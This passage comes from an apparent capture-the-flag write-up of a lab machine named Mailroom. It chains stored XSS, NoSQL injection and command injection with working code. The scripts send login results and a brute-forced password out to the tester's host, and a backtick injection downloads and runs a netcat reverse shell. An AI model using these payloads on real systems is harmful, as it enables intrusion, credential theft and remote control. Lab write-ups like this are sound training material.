+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">message</span><span class="o">=</span><span class="s1">&#39;&lt;script src=&#34;http://10.10.14.35/nosqli.js&#34;&gt;&lt;/script&gt;&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-f
+</span></span></code></pre></div><p>Using the same Flask app as before, the decoded text indicates that the request was successful and that a 2FA token has been sent to an inbox.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">2023-07-17 23:03:04,872 - INFO - 10.10.11.209 - - <span class="o">[</span>17/Jul/2023 23:03:04<span class="o">]</span> <span class="s2">&#34;GET /nosqli.js HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;success&#34;</span>:false,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Invalid input detected&#34;</span><span class="o">}{</span><span class="s2">&#34;success&#34;</span>:true,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Check your inbox for an email with your 2FA token&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">2023-07-17 23:03:05,039 - INFO - 10.10.11.209 - - <span class="o">[</span>17/Jul/2023 23:03:05<span class="o">]</span> <span class="s2">&#34;GET /exfil?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></div><p>There are actually two JSON responses here, one of which is invalid and the next is successful because the invalid response lacks an exit statement, allowing the remainder code to execute. Testing the three usernames found on the Gitea sitemap. Since the login page needs an email, appending <code>@mailroom.htb</code> to the usernames.</p>
+<p><em>user_enum.js</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// var formData = &#34;email[$eq]=administrator@mailroom.htb&amp;password[$exists]=true&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="s2">&#34;email[$eq]=tristan@mailroom.htb&amp;password[$exists]=true&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// var formData = &#34;email[$eq]=matthew@mailroom.htb&amp;password[$exists]=true&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;http://staff-review-panel.mailroom.htb/auth.php&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="nx">formData</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type&#34;</span><span class="o">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">text</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">fetch</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sb">`http://10.10.14.35/exfil?data=</span><span class="si">${</span><span class="nx">btoa</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">unescape</span><span class="p">(</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">text</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span><span class="si">}</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Error:&#34;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pB POST mailroom.htb/contact.php <span class="nv">email</span><span class="o">=</span>abraxas@mailroom.htb <span class="nv">title</span><span class="o">=</span>Test <span class="nv">message</span><span class="o">=</span><span class="s1">&#39;&lt;script src=&#34;http://10.10.14.35/user_enum.js&#34;&gt;&lt;/script&gt;&#39;</span> -f
+</span></span></code></pre></div><p>I get a success response with <code>tristan</code>, so its a valid user on the staff website.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python xxs_flask.py
+</span></span><span class="line"><span class="cl"> * Serving Flask app <span class="s1">&#39;xxs_flask&#39;</span>
+</span></span><span class="line"><span class="cl"> * Debug mode: off
+</span></span><span class="line"><span class="cl">2023-07-18 05:35:16,670 - INFO - WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+</span></span><span class="line"><span class="cl"> * Running on all addresses <span class="o">(</span>0.0.0.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> * Running on http://127.0.0.1:80
+</span></span><span class="line"><span class="cl"> * Running on http://192.168.253.133:80
+</span></span><span class="line"><span class="cl">2023-07-18 05:35:16,670 - INFO - Press CTRL+C to quit
+</span></span><span class="line"><span class="cl">2023-07-18 05:35:53,458 - INFO - 10.10.11.209 - - <span class="o">[</span>18/Jul/2023 05:35:53<span class="o">]</span> <span class="s2">&#34;GET /nosqli.js HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;success&#34;</span>:false,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Invalid input detected&#34;</span><span class="o">}{</span><span class="s2">&#34;success&#34;</span>:true,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Check your inbox for an email with your 2FA token&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">2023-07-18 05:35:53,638 - INFO - 10.10.11.209 - - <span class="o">[</span>18/Jul/2023 05:35:53<span class="o">]</span> <span class="s2">&#34;GET /exfil?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></div><p>Now that we have the username, the next step is to brute force the password for Tristan. Initially I tried crafting an async script with <code>fetch()</code>, but it didn&rsquo;t work as expected, so I eventually switched to sending the requests via <code>XMLHttpRequest</code> synchronously. Certain special characters had to be excluded from the character set due to a potential conflict with the regex validation. It&rsquo;s plausible that a step was overlooked during this trial and error process, and this could be a false positive.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Removed special chars like $,*,?,+... etc, might cause issues with regex
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">charset</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%&lt;&gt;@#&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">charset</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">payload_req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">test_pass</span> <span class="o">=</span> <span class="nx">password</span> <span class="o">+</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Doesn&#39;t like async
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">payload_req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;http://staff-review-panel.mailroom.htb/auth.php&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">payload_req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">payload_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;email=tristan@mailroom.htb&amp;password[$regex]=&#34;</span> <span class="o">+</span> <span class="nx">test_pass</span> <span class="o">+</span> <span class="s2">&#34;.*&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">payload_req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;2FA&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">password</span> <span class="o">+=</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">exfil</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exfil</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;http://10.10.14.35/?passwd=&#34;</span> <span class="o">+</span> <span class="nx">password</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exfil</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// reset the loop
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Subsequently, the python server starts receiving a series of requests, that ultimately provide the password for the user <code>tristan</code>: <code>69trisRulez!</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; www
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:20:31<span class="o">]</span> code 404, message File not found
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:20:32<span class="o">]</span> <span class="s2">&#34;GET /password_bruteforce.js HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:20:44<span class="o">]</span> <span class="s2">&#34;GET /password_bruteforce.js HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:20:45<span class="o">]</span> code 404, message File not found
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:20:45<span class="o">]</span> <span class="s2">&#34;GET /passwd?6 HTTP/1.1&#34;</span> <span class="m">404</span> -
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:25:46<span class="o">]</span> <span class="s2">&#34;GET /password_bruteforce.js HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:25:48<span class="o">]</span> code 404, message File not found
+</span></span><span class="line"><span class="cl">10.10.11.209 - - <span class="o">[</span>25/Apr/2023 16:25:48<span class="o">]</span> <span class="s2">&#34;GET /passwd?69trisRulez! HTTP/1.1&#34;</span> <span class="m">404</span> -
+</span></span></code></pre></div><p>Since the staffroom site is still inaccessible, decided to reuse the credentials for SSH. This resulted in obtaining a shell as <code>tristan</code>!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; pc <span class="s1">&#39;tristan:69trisRulez!&#39;</span>@mailroom.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>09:16:08<span class="o">]</span> Welcome to pwncat 🐈!                                                                    __main__.py:164
+</span></span><span class="line"><span class="cl"><span class="o">[</span>09:16:11<span class="o">]</span> mailroom.htb:22: registered new host w/ db                                                manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/home/tristan$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>tristan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>tristan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>tristan<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/home/tristan$
+</span></span></code></pre></div><hr>
+<h2 id="horizontal-privilege-escalation" class="relative group">Horizontal Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#horizontal-privilege-escalation" aria-label="Anchor">#</a></span></h2><hr>
+<p>Tristan lacks any sudo privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/home/tristan$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> tristan:
+</span></span><span class="line"><span class="cl">Sorry, user tristan may not run sudo on mailroom.
+</span></span></code></pre></div><p>However, I discovered another user named <code>matthew</code> with a login shell, as indicated in <code>/etc/passwd</code> and <code>/home</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/home/tristan$ ls -la /home
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> root    root    <span class="m">4096</span> Jan <span class="m">15</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root    root    <span class="m">4096</span> Mar <span class="m">26</span> 00:46 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> matthew matthew <span class="m">4096</span> Jul <span class="m">19</span> 13:17 matthew
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> tristan tristan <span class="m">4096</span> Jan <span class="m">15</span>  <span class="m">2023</span> tristan
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/home/tristan$ cat /etc/passwd <span class="p">|</span> grep sh$
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">tristan❌1000:1000:tristan:/home/tristan:/bin/bash
+</span></span><span class="line"><span class="cl">matthew❌1001:1001:,,,:/home/matthew:/bin/bash
+</span></span></code></pre></div><p>On successful authentication response from the staff site, it indicates that a 2FA token has been sent to a mail with the message: <code>{&quot;success&quot;:true,&quot;message&quot;:&quot;Check your inbox for an email with your 2FA token&quot;}</code>. Using this information, found an email for the user <code>tristan</code> in the <code>/var/mail</code> directory, which contains the 2FA token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/var/mail$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxrwsr-x  <span class="m">2</span> root    mail <span class="m">4096</span> Jul <span class="m">19</span> 13:14 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">12</span> root    root <span class="m">4096</span> Jan <span class="m">19</span> 13:22 ..
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root    mail    <span class="m">1</span> Jan <span class="m">15</span>  <span class="m">2023</span> root
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> tristan mail  <span class="m">417</span> Jul <span class="m">19</span> 13:18 tristan
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/var/mail$ cat tristan
+</span></span><span class="line"><span class="cl">Return-Path: &lt;noreply@mailroom.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: tristan@mailroom.htb
+</span></span><span class="line"><span class="cl">Delivered-To: tristan@mailroom.htb
+</span></span><span class="line"><span class="cl">Received: from localhost <span class="o">(</span>unknown <span class="o">[</span>172.19.0.5<span class="o">])</span>
+</span></span><span class="line"><span class="cl">    by mailroom.localdomain <span class="o">(</span>Postfix<span class="o">)</span> with SMTP id E2E681CB3
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> &lt;tristan@mailroom.htb&gt;<span class="p">;</span> Wed, <span class="m">19</span> Jul <span class="m">2023</span> 13:14:50 +0000 <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Subject: 2FA
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token<span class="o">=</span>9eafe490e2ae459894df81a7f3b7b2ce
+</span></span></code></pre></div><p>Despite being unable to locate the source code for the site, it can be accessed using <code>curl</code> on localhost.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> tristan@mailroom:/dev/shm$ curl -I  staff-review-panel.mailroom.htb
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">19</span> Jul <span class="m">2023</span> 13:52:20 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.4.33
+</span></span><span class="line"><span class="cl">Set-Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>82f030a6564259c7edf5f9d308875788<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Access-Control-Allow-Origin: *
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span></code></pre></div><p>Given that the site seems to be internal, forwarding port 80 using SSH using the existing connection. Also added the vhosts for <code>127.0.0.1</code> on the attack box.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; _ <span class="nb">echo</span> <span class="s1">&#39;127.0.0.1 mailroom.htb    git.mailroom.htb    staff-review-panel.mailroom.htb&#39;</span> &gt;&gt; /etc/hosts
+</span></span><span class="line"><span class="cl">&gt; ssh tristan@mailroom.htb -N -L 80:127.0.0.1:80
+</span></span><span class="line"><span class="cl">tristan@mailroom.htb<span class="err">&#39;</span>s password:
+</span></span></code></pre></div><h3 id="shell-as-www-data-in-the-container" class="relative group">Shell as www-data in the container <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shell-as-www-data-in-the-container" aria-label="Anchor">#</a></span></h3><p>With the auth token from Tristan&rsquo;s email, the staff review website can be accessed. Nevertheless, the dashboard itself doesn&rsquo;t provide a lot of information.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/staff-review-panel-dashboard.png" alt="staff-review-panel dashboard" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>The Inspect page is interesting, it accepts inquiry IDs and can</p>
+<ul>
+<li>search for inquires</li>
+<li>check for status of the inquiry</li>
+</ul>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/inquiry-status.png" alt="Inquiry status" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>This relates to the <code>shell_exec()</code> vulnerability found earlier on Gitea.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inquiry_id&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$inquiryId</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\$&lt;&gt;;|&amp;{}\(\)\[\]\&#39;\&#34;]/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;inquiry_id&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$contents</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;cat /var/www/mailroom/inquiries/</span><span class="si">$inquiryId</span><span class="s2">.html&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>Given this information, it&rsquo;s apparent that characters such as <code>$&lt;&gt;;|&amp;[]</code> are filtered, preventing command chaining. However, backticks remain unfiltered and can be used for command injection. Sending a request like this returns a response on a local HTTP server running on the attack box, confirming command injection on the <code>inquiry_id</code> parameter.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID<span class="o">=</span>d9e2302f38cb5348e2254ef887b4cf66 <span class="nv">inquiry_id</span><span class="o">=</span><span class="s1">&#39;test`curl http://10.10.14.35:8000`&#39;</span> -f
+</span></span></code></pre></div><p>To establish a reverse shell, uploaded a shell that utilized the <code>netcat mkfifo</code> reverse shell and executed it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.35 9005 &gt;/tmp/f&#39;</span> &gt; revshell.sh
+</span></span><span class="line"><span class="cl">&gt; http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID<span class="o">=</span>d9e2302f38cb5348e2254ef887b4cf66 <span class="nv">inquiry_id</span><span class="o">=</span><span class="s1">&#39;test`curl http://10.10.14.35:8000/revshell.sh --output /dev/shm/revshell.sh`&#39;</span> -f
+</span></span><span class="line"><span class="cl">&gt; http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID<span class="o">=</span>d9e2302f38cb5348e2254ef887b4cf66 <span class="nv">inquiry_id</span><span class="o">=</span><span class="s1">&#39;test`bash /dev/shm/revshell.sh`&#39;</span> -f
+</span></span></code></pre></div><p>Successfully acquired a shell as the user <code>www-data</code> within what appears to be a Docker container environment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$ connect -lp <span class="m">9005</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>10:22:49<span class="o">]</span> received connection from 10.10.11.209:45642                                                   bind.py:84
+</span></span><span class="line"><span class="cl"><span class="o">[</span>10:22:52<span class="o">]</span> 0.0.0.0:9005: upgrading from /bin/dash to /bin/bash                                       manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">[</span>10:22:53<span class="o">]</span> 10.10.11.209:45642: registered new host w/ db                                             manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@53d93393da5c:/var/www/staffroom$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@53d93393da5c:/var/www/staffroom$ hostname
+</span></span><span class="line"><span class="cl">53d93393da5c
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@53d93393da5c:/var/www/staffroom$ ls -la /.dockerenv
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">0</span> Jul <span class="m">19</span> 12:29 /.dockerenv
+</span></span></code></pre></div><h3 id="docker-escape" class="relative group">Docker escape <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#docker-escape" aria-label="Anchor">#</a></span></h3><p>The git repository containing the source code for the site is located at <code>/var/www/staffroom</code>. While enumerating the git repository, came across credentials within the Git remote URL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@53d93393da5c:/var/www/staffroom$ git log --pretty<span class="o">=</span>oneline
+</span></span><span class="line"><span class="cl">4b6cd765986ff06ea7247528c42b4127633beb22 <span class="o">(</span>HEAD -&gt; main, origin/main, origin/HEAD<span class="o">)</span> fixed path bug <span class="p">&amp;</span> email spam
+</span></span><span class="line"><span class="cl">1677521748602cce2f0d7ab25664ac6d414e26ef fixed path problem
+</span></span><span class="line"><span class="cl">4d3b167f4f228d18f97bb85da6983ff629274a3a added site
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@53d93393da5c:/var/www/staffroom$ git remote -v
+</span></span><span class="line"><span class="cl">origin  http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git <span class="o">(</span>fetch<span class="o">)</span>
+</span></span><span class="line"><span class="cl">origin  http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git <span class="o">(</span>push<span class="o">)</span>
